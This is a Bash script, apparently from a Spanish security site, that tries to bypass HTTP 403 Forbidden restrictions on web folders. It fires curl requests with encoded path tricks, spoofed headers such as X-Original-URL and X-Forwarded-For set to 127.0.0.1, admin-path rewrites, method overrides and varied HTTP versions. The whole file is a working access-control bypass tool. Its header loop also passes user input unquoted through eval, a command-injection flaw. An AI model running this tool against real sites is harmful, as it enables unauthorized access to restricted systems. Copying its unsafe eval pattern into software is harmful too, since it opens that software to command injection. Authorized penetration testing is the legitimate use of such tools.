#!/bin/bash
#######################################################################
# Antonio Taboada 2025 # hackingyseguridad.com
# Prueba a salgar el error 403 Forbidden en carpetas de portales web 
#######################################################################
#
echo "Bypassing 403 Forbidden .. "

RED='\033[0;31m'
GREEN='\033[0;32m'
BLUE='\033[0;34m'
WHITE='\033[1;37m'
YELLOW='\033[1;33m'
RESET='\033[0m'
VIOLET='\033[38;2;138;43;226m'
ORANGE='\033[38;2;255;165;0m'
INDIGO='\033[38;2;75;0;130m'
echo -e "${ORANGE}"
echo -e "${ORANGE}"
echo "    "
echo "./bypass-403.sh $1 $2"
echo " "
colorize_status_code() {
    http_code=$1
    # Apply color based on HTTP status code
    if [[ "$http_code" == "200" ]]; then
        echo -e "${GREEN}${http_code}${RESET}"
    elif [[ "$http_code" == "403" ]]; then
        echo -e "${RED}${http_code}${RESET}"
    elif [[ "$http_code" == "405" ]]; then
        echo -e "${ORANGE}${http_code}${RESET}"
    elif [[ "$http_code" == "404" ]]; then
        echo -e "${RED}${http_code}${RESET}"
    elif [[ "$http_code" == "500" ]]; then
        echo -e "${VIOLET}${http_code}${RESET}"
    elif [[ "$http_code" == "400" ]]; then
        echo -e "${RED}${http_code}${RESET}"
    else
        echo -e "${YELLOW}${http_code}${RESET}"
    fi
}
echo -e "${VIOLET}PATH FUZZING${RESET}"
echo ""
fuzz_paths=("$1/$2" "$1/%2f/$2" "$1/$2/%2f/" "$1/$2%2f/" "$1/$2//%3B/" "$1//%3B/$2" "$1/%00/$2" "$1/$2%00/" "$1/$2/%00/" "$1/%0d/$2" "$1/$2%0d/" "$1/$2/%0d/" "$1/%23/$2" "$1/$2%23/" "$1/$2/%23/" "$1/*/$2" "$1/$2*/" "$1/$2/*/" "$1/%252e**/$2" "$1/$2%252e**/" "$1/$2/%252e**/" "$1/%ef%bc%8f/$2" "$1/$2%ef%bc%8f/" "$1/$2/%ef%bc%8f/" "$1/%2e/$2" "$1/$2/." "$1//$2//" "$1//$2" "$1/./$2/./" "$1/./$2" "$1/$2%20" "$1/$2%09" "$1/$2?" "$1/$2.html" "$1/$2/?anything" "$1/$2#" "$1/$2/*" "$1/$2.php" "$1/$2.json" "$1/$2..;/" "$1/$2;/")
for path in "${fuzz_paths[@]}"; do
    response=$(curl -k -s -o /dev/null -iL -w "%{http_code},%{size_download}" "$path")
    http_code=$(echo "$response" | cut -d',' -f1)  # Extract the HTTP status code
    size=$(echo "$response" | cut -d',' -f2)       # Extract the size part
    colorized_code=$(colorize_status_code "$http_code")  # Colorize the status code
    echo -e "  --> ${path}  Response: [${colorized_code}] Size: ${size}"
done
echo ""
echo -e "${VIOLET}HEADER FUZZING${RESET}"
echo ""
fuzz_headers=(
    "-H 'X-Original-URL: $2'"
    "-H 'X-Custom-IP-Authorization: 127.0.0.1'"
    "-H 'X-Originating-IP: 127.0.0.1'"
    "-H 'X-Forwarded: 127.0.0.1'"
    "-H 'X-Remote-IP: 127.0.0.1'"
    "-H 'X-Remote-Addr: 127.0.0.1'"
    "-H 'X-ProxyUser-Ip: 127.0.0.1'"
    "-H 'X-Forwarded-For: 127.0.0.1'"
    "-H 'X-Forwarded-For: 127.0.0.1:80'"
    "-H 'X-Custom-IP-Authorization: 127.0.0.1:80'"
    "-H 'X-Originating-IP: 127.0.0.1:80'"
    "-H 'X-Remote-IP: 127.0.0.1:80'"
    "-H 'X-Remote-Addr: 127.0.0.1:80'"
    "-H 'X-rewrite-url: $2'"
    "-H 'Host: localhost'"
    "-H 'X-Host: 127.0.0.1'"
    "-H 'X-Forwarded-Host: 127.0.0.1'"
    "-H 'Content-Length: 0' -X POST"
        "-H 'X-Original-URL: /admin/console'"
        "-H 'X-Rewrite-URL: /admin/console'"
        "-H 'X-Original-URL: /admin/'"
        "-H 'X-Rewrite-URL: /admin/'"
        "-H 'X-Original-URL: /admin/'"
        "-H 'X-Rewrite-URL: /admin/'"
        "-H 'X-HTTP-Method-Override: PATCH'"
        "-H 'X-HTTP-Method-Override: CONNECT'"
        "-H 'X-HTTP-Method-Override: TRACE'"
        "-H 'X-HTTP-Method-Override: HEAD'"
        "-H 'X-HTTP-Method-Override: POST'"
        "-H 'X-HTTP-Method-Override: PUT'"
        "-H 'X-Forwarded-Port: 443'"
        "-H 'X-Forwarded-Port: 443'"
        "-H 'X-Forwarded-Port: 4443'"
        "-H 'X-Forwarded-Port: 4443'"
        "-H 'X-Forwarded-Port: 80'"
        "-H 'X-Forwarded-Port: 8080'"
        "-H 'X-Forwarded-Port: 8443'"
        "-H 'X-Forwarded-Port: 8443'"
)

for header in "${fuzz_headers[@]}"; do
    response=$(eval "curl -k -s -o /dev/null -iL -w '%{http_code},%{size_download}' $header $1/$2")
    http_code=$(echo "$response" | cut -d',' -f1)  # Extract the HTTP status code
    size=$(echo "$response" | cut -d',' -f2)       # Extract the size part
    colorized_code=$(colorize_status_code "$http_code")  # Colorize the status code
    echo -e "  --> ${1}/${2} ${header} Response: [${colorized_code}] Size: ${size}"
done
echo ""
echo -e "${VIOLET}HTTP METHOD FUZZING${RESET}"
echo ""
methods=("PUT" "GET" "POST" "CONNECT" "TRACE" "PATCH" "ARBITRARY" "ACL" "TRACK"    ) #You can also add HEAD METHOD here..
for method in "${methods[@]}"; do
    response=$(curl -k -s -o /dev/null -iL -w "%{http_code},%{size_download}" -X "$method" "$1/$2")
    http_code=$(echo "$response" | cut -d',' -f1)  # Extract the HTTP status code
    size=$(echo "$response" | cut -d',' -f2)       # Extract the size part
    colorized_code=$(colorize_status_code "$http_code")  # Colorize the status code
    echo -e "  --> ${1}/${2} -X $method Response: [${colorized_code}] Size: ${size}"
done
echo ""
echo -e "${VIOLET}HTTP PROTOCOL VERSION FUZZING${RESET}"
echo ""
versions=("0.9" "1.0" "1.1")
for version in "${versions[@]}"; do
    response=$(curl -k -s -o /dev/null -iL -w "%{http_code},%{size_download}" "$1/$2" --http"$version")
    http_code=$(echo "$response" | cut -d',' -f1)  # Extract the HTTP status code
    size=$(echo "$response" | cut -d',' -f2)       # Extract the size part
    colorized_code=$(colorize_status_code "$http_code")  # Colorize the status code
    echo -e "  --> ${1}/${2} with HTTP/$version Response: [${colorized_code}] Size: ${size}"
done

